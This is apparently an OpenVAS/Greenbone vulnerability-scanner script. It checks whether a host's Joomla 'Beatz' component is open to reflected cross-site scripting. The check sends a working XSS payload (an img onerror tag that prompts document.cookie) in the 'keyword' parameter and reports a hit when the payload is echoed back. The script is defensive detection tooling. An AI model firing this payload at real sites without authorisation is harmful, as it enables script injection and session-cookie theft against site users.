CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902671" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_bugtraq_id( 53030 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-04-25 17:38:13 +0530 (Wed, 25 Apr 2012)" );
	script_name( "Joomla! 'Beatz' Component Multiple Cross Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53030" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/74912" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/522361" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/111896/joomlabeatz-xss.txt" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
and script code, which will be executed in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Joomla! Beatz Component" );
	script_tag( name: "insight", value: "The flaws are due to improper validation of user-supplied inputs passed via
the 'do', 'keyword', and 'video_keyword' parameters to the 'index.php', which allows attackers to execute
arbitrary HTML and script code in the context of an affected application or site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Joomla Beatz component and is prone to multiple cross
site scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/beatz/index.php?do=listAll&keyword=++Search\"><img+src=" + "0+onerror=prompt(document.cookie)>&option=com_find";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "onerror=prompt\\(document.cookie\\)>", extra_check: "BeatzHeader" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

